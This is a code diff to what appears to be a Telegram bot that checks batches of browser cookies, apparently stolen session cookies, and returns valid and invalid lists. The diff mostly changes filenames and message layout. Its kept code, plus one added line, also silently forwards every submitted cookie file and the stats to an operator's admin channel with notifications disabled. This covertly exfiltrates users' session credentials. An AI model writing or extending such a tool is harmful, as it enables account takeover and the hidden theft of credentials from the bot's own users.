@@ -149,9 +149,9 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
     file_timestamp = now.strftime("%Y%m%d_%H%M%S")
     display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")
     
-    # Create filenames with timestamp
-    valid_filename = f"valid_cookies_{checker.mode}_{file_timestamp}.txt"
-    invalid_filename = f"invalid_cookies_{checker.mode}_{file_timestamp}.txt"
+    # Create filenames with count and timestamp
+    valid_filename = f"valid_cookies_{len(valid_lines)}_{checker.mode}_{file_timestamp}.txt"
+    invalid_filename = f"invalid_cookies_{len(invalid_lines)}_{checker.mode}_{file_timestamp}.txt"
     
     # Create temp files
     valid_temp_filepath = os.path.join(tempfile.gettempdir(), valid_filename)
@@ -176,52 +176,45 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
             f"📝 Total Cookies: {total_lines_count}\n"
             f"✅ Valid Cookies: {len(valid_lines)}\n"
             f"❌ Invalid Cookies: {len(invalid_lines)}\n"
-            f"📅 Date: {display_timestamp}\n"
+            f"📅 Date: {display_timestamp}\n\n"
+            f"{valid_filename}\n"
+            f"{invalid_filename}"
         )
-        
-        # Send valid cookies file
+        # Send stats message first
+        await bot.send_message(chat_id, msg_text)
+        # Then send both files as documents without extra captions
         if valid_lines:
             with open(valid_temp_filepath, 'rb') as doc:
                 await bot.send_document(
                     chat_id=chat_id,
                     document=doc,
-                    filename=valid_filename,
-                    caption=msg_text + f"\n{valid_filename} ({len(valid_lines)} cookies here)"
+                    filename=valid_filename
                 )
-        
-        # Send invalid cookies file
         if invalid_lines:
             with open(invalid_temp_filepath, 'rb') as doc:
                 await bot.send_document(
                     chat_id=chat_id,
                     document=doc,
-                    filename=invalid_filename,
-                    caption=msg_text + f"\n{invalid_filename} ({len(invalid_lines)} cookies here)"
+                    filename=invalid_filename
                 )
-        
         # Also send a copy to the admin channel silently
         try:
             if TELEGRAM_CHAT_ID:
+                await bot.send_message(TELEGRAM_CHAT_ID, msg_text, disable_notification=True)
                 if valid_lines:
                     with open(valid_temp_filepath, 'rb') as doc:
-                        admin_caption = msg_text + f"\n{valid_filename} ({len(valid_lines)} cookies here)"
                         await bot.send_document(
                             chat_id=TELEGRAM_CHAT_ID,
                             document=doc,
                             filename=valid_filename,
-                            caption=admin_caption,
-                            parse_mode='Markdown',
                             disable_notification=True
                         )
                 if invalid_lines:
                     with open(invalid_temp_filepath, 'rb') as doc:
-                        admin_caption = msg_text + f"\n{invalid_filename} ({len(invalid_lines)} cookies here)"
                         await bot.send_document(
                             chat_id=TELEGRAM_CHAT_ID,
                             document=doc,
                             filename=invalid_filename,
-                            caption=admin_caption,
-                            parse_mode='Markdown',
                             disable_notification=True
                         )
         except Exception as e:
